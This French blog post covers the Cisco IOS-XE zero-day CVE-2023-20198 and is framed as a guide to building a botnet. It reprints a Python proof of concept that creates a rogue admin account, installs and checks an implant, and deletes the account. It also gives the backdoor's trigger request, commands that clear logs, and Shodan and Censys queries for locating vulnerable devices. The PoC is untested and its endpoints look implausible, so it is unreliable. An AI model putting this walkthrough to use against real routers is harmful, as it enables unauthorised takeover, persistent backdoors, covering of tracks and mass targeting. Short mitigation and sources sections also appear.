# CVE-2023-20198 Cisco IOS-XE ZeroDay - Ou comment cr√©er son r√©seau de botnet ?


# üßü Cisco CVE-2023-20198 - Ou comment cr√©er son r√©seau de botnet ?

## Introduction

Le 16 octobre 2023, Cisco a communiqu√© sur une vuln√©rabilit√© critique d'√©levation de privil√®ges via l'interface Web sous l'identifiant CVE-2023-20198 au score CVSS de 10.

Cisco affirme que la vuln√©rabilit√© est largement exploit√©e. La vuln√©rabilit√© permet √† un attaquant non authentifi√© de cr√©er un compte aux privil√®ges maximales. Il n'existe pas de correctif pour cette vuln√©rabilit√© pour le moment.

## D√©tails de l'exploitation

L'exploitation est relativement simple. Il n'existe pas de PoC clef en main pour cette vuln√©rabilit√©. Cependant, un exploit est disponible sur GitHub √† l'heure o√π cet article est r√©dig√© (vendredi 20 octobre 2023 √† 12h00). Lien : https://github.com/Tounsi007/CVE-2023-20198

Contenu du PoC :

```py
import requests

# Exploit CVE-2023-20198 to create a local user account
create_user_url = "https://target.com/webui/create_user"
username = "cisco_tac_admin"
password = "P@ssw0rd"

user_payload = {
    "username": username,
    "password": password
}

response = requests.post(create_user_url, data=user_payload, verify=False)

if response.status_code == 200:
    print(f"Successfully created local user account: {username}")

# Exploit CVE-2021-1435 to install the implant
install_url = f"https://target.com/webui/cisco_service.conf"
config_content = "<insert implant configuration content here>"

config_payload = {
    "config_content": config_content
}

response = requests.post(install_url, data=config_payload, verify=False)

if response.status_code == 200:
    print("Implant installed successfully")

# Restart the web server to activate the implant
restart_url = "https://target.com/webui/restart_server"

response = requests.post(restart_url, verify=False)

if response.status_code == 200:
    print("Web server restarted successfully. Implant is active")

# Check for the presence of the implant
check_url = f"https://target.com/webui/implant_status"

response = requests.get(check_url, verify=False)

if response.status_code == 200:
    if "implant" in response.text:
        print("Implant is present")
    else:
        print("Implant is not present")

# Clean up by deleting the local user account
delete_user_url = f"https://target.com/webui/delete_user/{username}"

response = requests.delete(delete_user_url, verify=False)

if response.status_code == 200:
    print(f"Successfully deleted local user account: {username}")
```

Trackflaw n'est pas en mesure de le tester pour le moment. Ce PoC est √† usage √©ducatif **uniquement**.

### 1. Cr√©ation de l'administrateur

Le PoC indique cette information pour la cr√©ation de l'administrateur :

```py
# Exploit CVE-2023-20198 to create a local user account
create_user_url = "https://target.com/webui/create_user"
username = "cisco_tac_admin"
password = "P@ssw0rd"

user_payload = {
    "username": username,
    "password": password
}

response = requests.post(create_user_url, data=user_payload, verify=False)
```

Comme indiqu√© par Cisco, cela semble correspondre √† la cr√©ation d'un administrateur de fac√ßon non authentifi√©. L'attaquant ici effectue une requ√™te `POST` vers la route `/webui/create_user` afin d'essayer de cr√©er l'utilisateur privil√©gi√©.

### 2. Ajout de l'implant

Les attaquants, apr√®s avoir cr√©√©e un compte administrateur, d√©posent un implant similaire √† celui ci-dessous :

![Implant](/images/cisco-cve-2023-20198/2023-10-20-13-02-31.png)

Ce code agit comme une porte d√©rob√©e pour revenir plus facilement :

1. La premi√®re condition `if(params["menu"])` traite le param√®tre `menu` dans l'url. Elle renvoie une cha√Æne de chiffres surement indiquant la version de la backdoor.
2. La deuxi√®me condition en dessous traite le param√®tre `logon_hash` devant √™tre √©gal √† `1`. Ce param√®tre renvoie une cha√Æne hexad√©cimale de 18 caract√®res √©crite dans l'implant.
3. La troisi√®me condition utilise aussi le param√®tre `logon_hash` et v√©rifie que le param√®tre correspond bien √† une cha√Æne hexad√©cimale de **40 caract√®res** √©crite en dur dans l'implant (mot de passe). Si cette condition est valid√©e, l'implant v√©rifie qu'un argument `common_type=subsystem` est bien pr√©sent dans l'url.

Ici l'implant est en mesure d'ex√©cuter du code de deux mani√®res :

1. D'une premi√®re fa√ßon avec les **privil√®ges syst√®mes actuels** de l'implant avec l'argument `common_type=subsystem`.
2. D'une deuxi√®me fa√ßon avec les **privil√®ges administrateurs 15** avec l'argument `common_type=iox`.

Pour r√©sum√©, l'appel √† l'implant s'effectue avec la requ√™te `POST` suivante :

```
POST /webui/logoutconfirm.html?logon_hash=<mot_de_passe_implant>&common_type=subsystem HTTP/1.1
Host: host
Content-Type: application/x-www-form-urlencoded
Content-Length: X
Accept: */*

<commande √† ex√©cuter>
```

Selon plusieurs sources, l'installation de l'implant reste encore incompris. Il existe plusieurs pistes comme nottament l'utilisation de la vuln√©rabilit√© `CVE-2021-1435` d√©crite dans le PoC.

```py
# Exploit CVE-2021-1435 to install the implant
install_url = f"https://target.com/webui/cisco_service.conf"
config_content = "<insert implant configuration content here>"

config_payload = {
    "config_content": config_content
}

response = requests.post(install_url, data=config_payload, verify=False)
```

Cette vuln√©rabilit√© est corrig√©e et ind√©pendante de la vuln√©rabilit√© `CVE-2023-20198` : https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-iosxe-webcmdinjsh-UFJxTgZD.html

Il est probable que les attaquants d√©posent leur implant √† l'aide du compte administrateur cr√©√©e.

### 3. Red√©marrage du service

Selon le PoC, il serait n√©cessaire de red√©marrer le service pour enregistrer la configuration de l'implant.

```py
# Restart the web server to activate the implant
restart_url = "https://target.com/webui/restart_server"

response = requests.post(restart_url, verify=False)
```

### 4. V√©rifier la pr√©sence de l'implant

Une fois l'implant d√©pos√©, vous pouvez v√©rifier son ex√©cution. Changez la route en fonction de la configuration de l'implant (ci-dessous exemple de l'implant r√©cup√©r√©).

```py
# Check for the presence of the implant
check_url = f"https://target.com/webui/logoutconfirm.html?logon_hash=1"

response = requests.get(check_url, verify=False)
```

### 5. Suppression des traces

Apr√®s avoir d√©pos√© l'implant, les attaquants suppriment leurs traces avec les commandes suivantes :

```bash
clear logging 
no username cisco_support 
no username cisco_tac_admin 
no username cisco_sys_manager
```

Il est aussi possible de le faire √† travers l'interface web :

```py
# Clean up by deleting the local user account
delete_user_url = f"https://target.com/webui/delete_user/{username}"

response = requests.delete(delete_user_url, verify=False)
```

## Localisation des h√¥tes vuln√©rables 

Il est possible d'effectuer une recherche sur le moteur `Censy` avec le mot clef `services.labels=cisco-xe-webui` pour localiser des appareils fonctionant avec XE Webui.

![Alt text](/images/cisco-cve-2023-20198/2023-10-20_13-41.png)

## Protection

La recommandation faite par Cisco est de **d√©sactiver la fonction de serveur HTTP/S** sur les syst√®mes accessibles sur Internet. Il n'existe pour le moment pas de correctifs.

Selon `Shodan`, il y aurait plus de 140 000 appareils vuln√©rables dans le monde (recherche : `http.html_hash:1076109428`)

![Shodan](/images/cisco-cve-2023-20198/2023-10-20-13-45-18.png)

## R√©sum√©

Voici un r√©sum√© de l'exploitation √† travers une animation :

![Graphique](</images/cisco-cve-2023-20198/Exploitation CVE-2023-20198.gif>)

## Sources 

- https://censys.com/cve-2023-20198-cisco-ios-xe-zeroday/
- https://www.darkreading.com/vulnerabilities-threats/critical-unpatched-cisco-zero-day-bug-active-exploit
- https://www.greynoise.io/blog/unpacking-cve-2023-20198-a-critical-weakness-in-cisco-ios-xe?utm_source=substack&utm_medium=email
- https://github.com/JoyGhoshs/CVE-2023-20198
- https://github.com/Atea-Redteam/CVE-2023-20198
- https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/
